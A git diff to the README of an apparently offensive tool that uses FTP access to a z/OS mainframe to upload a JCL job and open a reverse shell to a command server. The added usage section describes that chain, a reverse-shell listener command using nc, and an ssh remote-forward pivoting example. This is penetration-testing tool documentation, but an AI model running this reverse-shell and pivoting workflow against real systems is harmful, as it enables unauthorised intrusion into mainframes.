@@ -26,7 +26,22 @@ You have to create a user in your machine to get the reverse connection on your 
 It's up to you to manage what that user can do. The user does not need an interactive shell.
 
 ## Dependencies
-As an optional dependendency for exotic encondings/codepages you can install the `ebcdic` package for python.
+As an optional dependency for exotic encodings/codepages you can install the `ebcdic` package for python.
+
+## Usage:
+ * edit `config.ini`
+ * run `python ftp2shell.py config.ini`
+    - the script will connect via FTP
+    - generate and upload a JCL
+    - start a connection against `cc_server` and start a tunneled clear-text shell
+    - start the shell management
+ * the resulting shell is a nearly full-features SH shell
+ * there is a custom `_runssh` command which can be used to run further ssh commands. The best use is pivoting.
+
+For example, to get access to TN3270 on your localhost run:
+```
+mainframe> _runssh -R 2222:localhost:23
+```
 
 ## Testing
 You can run the stdio wrapper and the reverse shell manager from the commandline bu using the `-m` option in Python. For example:
@@ -35,6 +50,7 @@ python -m zosutils.reverseshellmanager cmd nc -l -p 1234
 ```
 
 ## Future Steps
+* Update this readme
 * Automate the pivoting by parsin the output of netstat/NETSTAT and:
     - ssh -R
     - ssh -L
